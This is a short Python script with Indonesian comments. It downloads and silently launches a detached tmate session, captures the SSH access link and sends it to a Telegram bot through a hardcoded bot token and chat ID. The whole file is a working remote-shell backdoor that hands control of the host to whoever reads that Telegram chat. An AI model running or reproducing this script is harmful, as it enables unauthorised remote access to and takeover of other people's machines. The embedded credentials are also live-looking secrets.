#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# --- KONFIG TELEGRAM ---
BOT_TOKEN = "8163512363:AAH7dF8aDr-NHYhF9JhZD62-zHSQ8Naz7uY"
CHAT_ID   = "7118252117"

# ---------------------------------
# TIDAK ADA YANG DIUBAH DARI PERINTAH BASH
# ---------------------------------
import os
import pathlib
import requests  # pip install requests

bash_commands = """
pkill -9 tmate
wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &>/dev/null
tar --skip-old-files -xf tmate-2.4.0-static-linux-i386.tar.xz &>/dev/null
bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh} -t" > tmate.txt
echo "Link tmate tersimpan di tmate.txt"
"""

# Jalankan seluruh blok bash
exit_code = os.system(bash_commands)
if exit_code != 0:
    raise SystemExit(f"Bash script gagal (exit code {exit_code >> 8})")

# Baca link tmate yang sudah disimpan
link = pathlib.Path("tmate.txt").read_text().strip()

# Kirim link ke Telegram
requests.post(
    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
    data={
        "chat_id": CHAT_ID,
        "text": link
    }
)
